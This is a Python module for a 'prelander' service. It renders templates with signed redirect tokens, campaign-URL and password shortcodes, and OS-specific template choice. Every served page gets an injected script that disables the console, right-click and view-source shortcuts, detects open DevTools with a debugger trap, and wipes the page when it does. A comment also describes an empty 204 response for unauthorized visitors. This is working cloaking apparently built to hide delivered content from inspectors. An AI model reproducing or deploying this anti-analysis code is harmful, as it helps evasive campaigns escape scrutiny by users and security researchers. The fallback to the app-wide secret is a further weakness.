"""
Secure Prelander Service
=========================
Server-side template rendering with signed redirect context validation.

Security Features:
- Signed short-lived redirect tokens (HMAC-SHA256)
- Template sandboxing (no arbitrary code execution)
- Safe placeholder substitution only
- Server-side validation (no JavaScript tricks)
"""

import hmac
import hashlib
import time
import re
from typing import Optional, Dict, Any
from datetime import datetime, timedelta
import logging

from jinja2 import Environment, BaseLoader, TemplateSyntaxError, select_autoescape
from jinja2.sandbox import SandboxedEnvironment

from app.core.constants import DOMAIN_TYPE_PRELANDER
from app.core.glossary import domain_type_filter

logger = logging.getLogger(__name__)

# Secret key for signing redirect context
# Sourced from settings/env (REDIRECT_SECRET_KEY); falls back to the app-wide
# JWT secret so tokens stay verifiable even when the dedicated key is unset.
import os
from app.config import get_settings

def _resolve_redirect_secret() -> str:
    configured = (get_settings().REDIRECT_SECRET_KEY or "").strip()
    if configured:
        return configured
    if os.getenv("REDIRECT_SECRET_KEY", "").strip():
        return os.getenv("REDIRECT_SECRET_KEY").strip()
    return get_settings().SECRET_KEY

REDIRECT_SECRET = _resolve_redirect_secret()

# Token expiration (5 minutes)
TOKEN_EXPIRATION_SECONDS = 300

# Known shortcodes (both {X} and {{ X }} formats accepted on input)
# {Campaign_URL} and {Password} are the documented shortcodes.
# {{ CAMPAIGN_URL }}, {{ PASSWORD }} etc. are the internal Jinja2 forms.
ALLOWED_PLACEHOLDERS = {
    "CAMPAIGN_URL",
    "PASSWORD",
    "CLICK_ID",
    "PUBLISHER_ID",
    "SITE_ID",
    "COUNTRY",
    "OS",
    "DEVICE_TYPE",
    "TIMESTAMP",
}

# Friendly shortcode aliases (case-insensitive, documented names → internal key)
_SHORTCODE_ALIASES: dict = {
    "campaign_url":  "CAMPAIGN_URL",
    "password":      "PASSWORD",
    "click_id":      "CLICK_ID",
    "publisher_id":  "PUBLISHER_ID",
    "site_id":       "SITE_ID",
    "country":       "COUNTRY",
    "os":            "OS",
    "device_type":   "DEVICE_TYPE",
    "timestamp":     "TIMESTAMP",
}


class RedirectContext:
    """
    Secure redirect context with signed token validation.
    Prevents unauthorized access to prelanders.
    """
    
    def __init__(
        self,
        click_id: str,
        campaign_url: str,
        publisher_id: Optional[str] = None,
        site_id: Optional[str] = None,
        country: Optional[str] = None,
        os: Optional[str] = None,
        device_type: Optional[str] = None,
        timestamp: Optional[int] = None,
        password: Optional[str] = None,
    ):
        self.click_id = click_id
        self.campaign_url = campaign_url
        self.publisher_id = publisher_id or ""
        self.site_id = site_id or ""
        self.country = country or ""
        self.os = os or ""
        self.device_type = device_type or ""
        self.timestamp = timestamp or int(time.time())
        # Campaign Password/text content — substituted for the {Password}
        # shortcode. It travels inside the signed token so the /p/render path
        # can replace it exactly like the campaign URL.
        self.password = password or ""

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary for serialization."""
        return {
            "click_id": self.click_id,
            "campaign_url": self.campaign_url,
            "publisher_id": self.publisher_id,
            "site_id": self.site_id,
            "country": self.country,
            "os": self.os,
            "device_type": self.device_type,
            "timestamp": self.timestamp,
            "password": self.password,
        }
    
    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> "RedirectContext":
        """Create from dictionary."""
        return cls(
            click_id=data.get("click_id", ""),
            campaign_url=data.get("campaign_url", ""),
            publisher_id=data.get("publisher_id"),
            site_id=data.get("site_id"),
            country=data.get("country"),
            os=data.get("os"),
            device_type=data.get("device_type"),
            timestamp=data.get("timestamp"),
            password=data.get("password"),
        )
    
    def sign(self) -> str:
        """Generate signed token for this context."""
        # Serialize context data
        data_parts = [
            self.click_id,
            self.campaign_url,
            self.publisher_id,
            self.site_id,
            self.country,
            self.os,
            str(self.timestamp),
            self.password,
        ]
        data_string = "|".join(data_parts)
        
        # Create HMAC signature
        signature = hmac.new(
            REDIRECT_SECRET.encode(),
            data_string.encode(),
            hashlib.sha256
        ).hexdigest()
        
        # Combine data and signature
        import base64
        token_data = f"{data_string}:{signature}"
        token = base64.urlsafe_b64encode(token_data.encode()).decode()
        
        return token
    
    @classmethod
    def verify(cls, token: str) -> Optional["RedirectContext"]:
        """
        Verify and decode a signed token.
        Returns None if invalid or expired.
        """
        try:
            import base64
            
            # Decode token
            token_data = base64.urlsafe_b64decode(token.encode()).decode()
            
            if ":" not in token_data:
                logger.warning("Invalid token format: missing separator")
                return None
            
            data_string, provided_signature = token_data.rsplit(":", 1)
            
            # Verify signature
            expected_signature = hmac.new(
                REDIRECT_SECRET.encode(),
                data_string.encode(),
                hashlib.sha256
            ).hexdigest()
            
            if not hmac.compare_digest(expected_signature, provided_signature):
                logger.warning("Token signature verification failed")
                return None
            
            # Parse data
            parts = data_string.split("|")
            if len(parts) < 8:
                logger.warning(f"Invalid token data: expected 8 parts, got {len(parts)}")
                return None
            
            click_id, campaign_url, publisher_id, site_id, country, os, timestamp_str = parts[:7]
            password = "|".join(parts[7:])  # the password may itself contain "|"
            timestamp = int(timestamp_str)
            
            # Check expiration
            if time.time() - timestamp > TOKEN_EXPIRATION_SECONDS:
                logger.warning(f"Token expired: age={time.time() - timestamp}s")
                return None
            
            # Create context
            return cls(
                click_id=click_id,
                campaign_url=campaign_url,
                publisher_id=publisher_id or None,
                site_id=site_id or None,
                country=country or None,
                os=os or None,
                timestamp=timestamp,
                password=password or None,
            )
            
        except Exception as e:
            logger.error(f"Token verification error: {e}")
            return None


def _normalise_shortcodes(html: str) -> str:
    """
    Translate documented {X} shortcodes into Jinja2 {{ INTERNAL }} vars.
    {Campaign_URL} → {{ CAMPAIGN_URL }}, {Password} → {{ PASSWORD }}, etc.
    Unknown {X} patterns are left as-is so validate_template can warn.
    """
    def _replace(m: re.Match) -> str:
        name = m.group(1)
        internal = _SHORTCODE_ALIASES.get(name.lower())
        return f"{{{{ {internal} }}}}" if internal else m.group(0)

    return re.sub(r'(?<!\{)\{([A-Za-z_][A-Za-z0-9_]*)\}(?!\})', _replace, html)


# ── ANTI-INSPECT HARDENING (injected into every rendered template) ──────
# Admin-authored full-HTML templates are served verbatim, so this runtime
# layer is injected server-side at render time. It:
#   1. Blacks out window.console (no flow narration into open DevTools)
#   2. Disables the right-click context menu (no "View Page Source" entry)
#   3. Swallows the inspect shortcuts (F12, Ctrl/Cmd+Shift+I/J/C/K, Ctrl+U,
#      Ctrl+S) and wipes the live DOM when they are pressed
#   4. Detects an attached DevTools (debugger-stall + window-dimension gap
#      heuristics) and wipes the live DOM so the Elements panel shows nothing
# NOTE: manual address-bar view-source: navigations are wire-identical to a
# normal GET and scripts never execute in source view — they cannot be
# intercepted client-side. The real view-source defense stays server-side:
# unauthorized visitors get the 204 shield and authorized visitors only ever
# view the source of the secret-free shell (content arrives via the
# session-validated JSON fetch, never embedded in the served HTML).
_HARDENING_SCRIPT = """
<script>
(function () {
  var w = window, d = document, noop = function () {};
  try {
    w.console = { log: noop, info: noop, warn: noop, error: noop, debug: noop,
      dir: noop, trace: noop, table: noop, clear: noop, group: noop,
      groupEnd: noop, time: noop, timeEnd: noop };
  } catch (e) {}
  var done = false;
  function wipe () { if (done) return; done = true; try { d.documentElement.innerHTML = ''; } catch (e) {} }
  function swallow (e) { e.preventDefault(); e.stopPropagation(); return false; }
  w.addEventListener('contextmenu', swallow, true);
  d.addEventListener('contextmenu', swallow, true);
  w.addEventListener('keydown', function (e) {
    var k = (e.key || '').toLowerCase();
    var mod = e.ctrlKey || e.metaKey;
    if (
      e.key === 'F12' ||
      (mod && e.shiftKey && (k === 'i' || k === 'j' || k === 'c' || k === 'k')) ||
      (e.metaKey && e.altKey && (k === 'i' || k === 'j' || k === 'c' || k === 'k')) ||
      (mod && k === 'u') ||
      (mod && k === 's')
    ) { e.preventDefault(); e.stopPropagation(); wipe(); }
  }, true);
  setInterval(function () {
    if (done) return;
    var t0 = performance.now();
    debugger;
    var stall = performance.now() - t0 > 120;
    var gap = (w.outerWidth - w.innerWidth > 160) || (w.outerHeight - w.innerHeight > 160);
    if (stall || gap) wipe();
  }, 1500);
})();
</script>"""


def _inject_hardening(html: str) -> str:
    """
    Inject the anti-inspect hardening script into a rendered HTML document.

    Placement priority:
      1. Immediately before the first ``</body>`` (case-insensitive)
      2. Immediately before the first ``</html>``
      3. Appended to the end (fragment templates without a body tag)
    """
    lowered = html.lower()
    idx = lowered.rfind("</body>")
    if idx != -1:
        return html[:idx] + _HARDENING_SCRIPT + html[idx:]
    idx = lowered.rfind("</html>")
    if idx != -1:
        return html[:idx] + _HARDENING_SCRIPT + html[idx:]
    return html + _HARDENING_SCRIPT


class PrelanderTemplateEngine:
    """
    Secure template rendering engine with sandboxing.
    Prevents arbitrary code execution from templates.
    """
    
    def __init__(self):
        # Use sandboxed Jinja2 environment
        self.env = SandboxedEnvironment(
            loader=BaseLoader(),
            autoescape=select_autoescape(['html', 'xml']),
        )
        
        # Disable dangerous features
        self.env.globals.clear()
        self.env.filters.clear()
        
        # Add only safe filters
        self.env.filters['upper'] = str.upper
        self.env.filters['lower'] = str.lower
        self.env.filters['title'] = str.title
    
    def render(
        self,
        template_html: str,
        context: RedirectContext,
    ) -> str:
        """
        Render template with safe placeholder substitution.

        Accepts both documented shortcode forms:
          {Campaign_URL}  →  friendly / documented
          {{ CAMPAIGN_URL }}  →  internal Jinja2 form
        Both are normalised to Jinja2 before rendering.
        """
        try:
            # Translate {X} shortcodes → {{ INTERNAL }} Jinja2 vars
            normalised_html = _normalise_shortcodes(template_html)

            # Validate that only allowed placeholders remain
            self._validate_template_placeholders(normalised_html)

            # Prepare safe context data
            safe_context = {
                "CAMPAIGN_URL": context.campaign_url,
                "PASSWORD": context.password or "",
                "CLICK_ID": context.click_id,
                "PUBLISHER_ID": context.publisher_id or "",
                "SITE_ID": context.site_id or "",
                "COUNTRY": context.country or "",
                "OS": context.os or "",
                "DEVICE_TYPE": context.device_type or "",
                "TIMESTAMP": str(context.timestamp),
            }

            # Render template in sandbox
            template = self.env.from_string(normalised_html)
            rendered = template.render(**safe_context)

            # Inject the anti-inspect hardening layer (console blackout,
            # right-click/inspect-shortcut blocking, DevTools DOM wipe) into
            # every served template — server-side, at render time.
            return _inject_hardening(rendered)

        except TemplateSyntaxError as e:
            logger.error(f"Template syntax error: {e}")
            raise ValueError(f"Invalid template syntax: {e}")
        except Exception as e:
            logger.error(f"Template rendering error: {e}")
            raise ValueError(f"Template rendering failed: {e}")
    
    def _validate_template_placeholders(self, template_html: str):
        """
        Validate that template only uses allowed placeholders.
        Raises ValueError if invalid placeholders found.
        """
        # Find all Jinja2 variable references
        pattern = r'\{\{\s*([A-Z_]+)\s*\}\}'
        placeholders = set(re.findall(pattern, template_html))
        
        # Check for disallowed placeholders
        invalid = placeholders - ALLOWED_PLACEHOLDERS
        if invalid:
            raise ValueError(f"Template contains disallowed placeholders: {invalid}")
    
    def validate_template(self, template_html: str) -> Dict[str, Any]:
        """
        Validate template syntax and security.
        Returns dict with validation result including warnings for unknown shortcodes.
        """
        # Translate friendly shortcodes first
        normalised_html = _normalise_shortcodes(template_html)

        # Detect any {Xyz} patterns that were NOT translated (unknown shortcodes)
        raw_shortcodes = set(re.findall(r'\{([A-Za-z_][A-Za-z0-9_]*)\}', template_html))
        unknown_raw = {s for s in raw_shortcodes if s.lower() not in _SHORTCODE_ALIASES}

        try:
            self._validate_template_placeholders(normalised_html)
            
            # Try to compile template
            self.env.from_string(normalised_html)
            
            # Extract used placeholders
            pattern = r'\{\{\s*([A-Z_]+)\s*\}\}'
            used_placeholders = set(re.findall(pattern, normalised_html))

            result: Dict[str, Any] = {
                "valid": True,
                "message": "Template is valid",
                "used_placeholders": list(used_placeholders),
            }
            if unknown_raw:
                result["warnings"] = [
                    f"Unknown shortcode {{{s}}} — it will not be replaced. "
                    f"Supported: {{Campaign_URL}}, {{Password}}"
                    for s in sorted(unknown_raw)
                ]
            return result
            
        except ValueError as e:
            return {
                "valid": False,
                "message": str(e),
                "used_placeholders": [],
                "warnings": [f"Unknown shortcode {{{s}}}" for s in sorted(unknown_raw)] if unknown_raw else [],
            }
        except TemplateSyntaxError as e:
            return {
                "valid": False,
                "message": f"Syntax error: {e}",
                "used_placeholders": [],
                "warnings": [],
            }
        except Exception as e:
            return {
                "valid": False,
                "message": f"Validation error: {e}",
                "used_placeholders": [],
                "warnings": [],
            }


async def get_template_for_domain(db, domain: str) -> Optional[Dict[str, Any]]:
    """
    Get active template assigned to a Prelander domain.
    Returns None if domain not found, inactive, or template is inactive/deleted.
    Falls back to OS default template when assigned template is gone.
    """
    from app.services.domain_service import normalize_domain

    normalized = normalize_domain(domain)
    domain_doc = await db.redirection_domains.find_one({
        "domain": normalized,
        "domain_type": domain_type_filter(DOMAIN_TYPE_PRELANDER),
        "status": "active",
    })
    if not domain_doc:
        return None

    template_id = domain_doc.get("template_id")
    if template_id:
        from bson import ObjectId
        try:
            template = await db.prelander_templates.find_one({
                "_id": ObjectId(template_id),
                "status": "active",
            })
            if template:
                return template
            # Template is inactive or deleted — fall through to OS default
        except Exception:
            pass

    # Domain OS hint (from the domain doc's template field)
    os_hint = domain_doc.get("template")  # "windows" | "mac" | "default"
    return await get_default_template(db, os_hint=os_hint)


async def get_default_template(db, os_hint: Optional[str] = None) -> Optional[Dict[str, Any]]:
    """
    Get the active Default Template for the given OS.

    Priority:
    1. Active default for the specific OS (is_default=True, os_type=<os>)
    2. Active default for os_type="both"
    3. Any active default (is_default=True)

    Returns None if no active default exists → caller should skip prelander.
    """
    if os_hint and os_hint not in ("default", "both"):
        # Try OS-specific default first
        tpl = await db.prelander_templates.find_one({
            "is_default": True,
            "status": "active",
            "os_type": os_hint,
        })
        if tpl:
            return tpl

    # Try "both" default
    tpl = await db.prelander_templates.find_one({
        "is_default": True,
        "status": "active",
        "os_type": "both",
    })
    if tpl:
        return tpl

    # Any active default
    return await db.prelander_templates.find_one({"is_default": True, "status": "active"})


def generate_fallback_html(message: str = "Loading...") -> str:
    """Generate safe fallback HTML when template unavailable."""
    return f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }}
        .container {{
            text-align: center;
            color: white;
        }}
        .spinner {{
            border: 4px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top: 4px solid white;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <h1>{message}</h1>
    </div>
</body>
</html>"""
